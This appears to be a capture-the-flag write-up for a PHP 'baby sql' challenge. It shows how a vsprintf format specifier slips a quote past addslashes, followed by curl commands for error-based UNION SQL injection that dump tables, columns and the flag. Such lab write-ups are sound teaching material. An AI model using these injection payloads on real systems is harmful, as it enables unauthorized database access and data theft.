<h1 style="text-align:center;">baby sql</h1>
*I heard that *real_escape_string() functions protect you from malicious user input inside SQL statements, I hope you can't prove me wrong...*

## Source Code
Let's make sense of the source code.
```php
<?php require 'config.php'; # Include the config file

class db extends Connection {
    public function query($sql) { # Define a function called query with a parameter know as "$sql", this will be the query
        $args = func_get_args(); # We then assign both parameters passed to the func to the $args variable
        unset($args[0]); # We then remove the query string from the array, leaving an array with 'admin' in it.
        return parent::query(vsprintf($sql, $args)); # First, format the 'admin' array into the query, and then run it on the database.
    }
}

$db = new db();

if (isset($_POST['pass'])) { # If the pass post variable is set then
    $pass = addslashes($_POST['pass']); # Run the addslashes function on the pass parameter and assign it to a variable
    $db->query("SELECT * FROM users WHERE password=('$pass') AND username=('%s')", 'admin'); #Call the query function from the db class
} else {
    die(highlight_file(__FILE__,1)); # Show this sourcecode
} 
```

## The Bug
Let's start by looking into what addslashes() does:
![](../../img/Pasted%20image%2020230509114515.png)

So this is where the challenge starts, we need to break out of a string while also bypassing the addslashes function. Initially, I was looking for some sort of encoding that would allow me to input a `'` without addslashes catching it, although that seemed to be a dead end in the newer versions of PHP

The `vsprintf` function it runs before running the query on the databases. What does vsprintf do?
![](../../img/Pasted%20image%2020230509114909.png)

`vsprintf` takes an array, that mus be why the `'admin'` string is passed as an array, Now, we cant touch the `%s` seen later on in the query, that will be replaced with admin, however, we can control what will be placed into the `$pass` variable, and then run through the `vsprintf` function. Let's do some testing on our local machine.

We can start by making suer our function work:
```
php > echo vsprintf("Hello %s", ['admin'])
Hello admin
```

PHP seems to be trying to read the "a" as a variable name. How can we tell PHP to use it as a literal char, instead of a variable name? Escape it
```
php > echo vsprintf("Hello %s, my name is %1$\a",['admin']);
Hello admin, my name is a
```

Perfect, we see our "a" is interpreted as a string. And of course, special characters:
```
php > echo vsprintf("Hello %s, my name is %1$\'",['admin']);
Hello admin, my name is '
```

## Exploitation
We can send our test payload to the server. and see what we get in response
```
kali@kali:~$ curl -XPOST http://165.232.41.211:30934/ -d "pass=%1$\'"
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'admin')' at line 1
```

This SQL error tells us that we succesfully broke out of the thing, and this consequently caused a server-side error. From here onwards, it is a matter of leaking the table name, and colums, and then finally reading the flag, I will do this avoiding any more double/single quotes as it is additional complexity.

Our next step should be to enumate the number of colums. This can be done via a UNION SELECT statement. No error is good.
```
kali@kali:~$ curl -XPOST http://165.232.41.211:30934/ -d "pass=%1$\') UNION SELECT 1;#"
The used SELECT statements have a different number of columns
kali@kali:~$ curl -XPOST http://165.232.41.211:30934/ -d "pass=%1$\') UNION SELECT 1,2;#"
kali@kali:~$
```

Perfect, so it is 2 colums, now, we know that errors are enabled as we got our SQL error earlier on. We can now abuse verbose errors to leak information. I have another post on blind SQL injections, and one of the methods used in said post takes advantage of these errors. So we can take inspiration, and implement it into our new challenge's payload:
```
pass=%1$\') UNION SELECT 1,extractvalue(0x0a,concat(0x0a,([SQL QUERY HERE])))#
```

First, lets read our tables.
```
kali@kali:~$ curl -XPOST http://165.232.41.211:30934/ -d "pass=%1$\') UNION SELECT 1,extractvalue(0x0a,concat(0x0a,(SELECT table_name FROM information_schema.tables)))#"
Subquery returns more than 1 row
kali@kali:~$ curl -XPOST http://165.232.41.211:30934/ -d "pass=%1$\') UNION SELECT 1,extractvalue(0x0a,concat(0x0a,(SELECT group_concat(table_name) FROM information_schema.tables)))#"
XPATH syntax error: 'ALL_PLUGINS,APPLICABLE_ROLES...'
```

That works, now we need to refine. If we can get a hold of the db name, then we can select only the tables from said db. Let's abuse some more errors.
```
kali@kali:~$ curl -XPOST http://165.232.41.211:30934/ -d "pass=%1$\') UNION SELECT 1,extractvalue(0x0a,concat(0x0a,(SELECT group_concat(table_name) FROM asd)))#"
Table 'db_m412.asd' doesn't exist
```

When we try and select from a table that doesn't exist, we can see the database error exposes the name. Next we can use hex encoding, to avoid the need for single/doule quotes.
```
kali@kali:~$ curl -XPOST http://165.232.41.211:30934/ -d "pass=%1$\') UNION SELECT 1,extractvalue(0x0a,concat(0x0a,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema REGEXP 0x64625f6d343132)))#"
XPATH syntax error: 'totally_not_a_flag,users'
```

There is our table name, now let's see the columns
```
kali@kali:~$ curl -XPOST http://165.232.41.211:30934/ -d "pass=%1$\') UNION SELECT 1,extractvalue(0x0a,concat(0x0a,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema REGEXP 0x64625f6d343132)))#"
XPATH syntax error: 'flag,username,password'
```

Finally, we can select our flag
```
kali@kali:~$ curl -XPOST http://165.232.41.211:30934/ -d "pass=%1$\') UNION SELECT 1,extractvalue(0x0a,concat(0x0a,(SELECT flag FROM totally_not_a_flag)))#"
XPATH syntax error: 'HTB{h0w_d1d_y0u_f1nd_m3?}' 
```
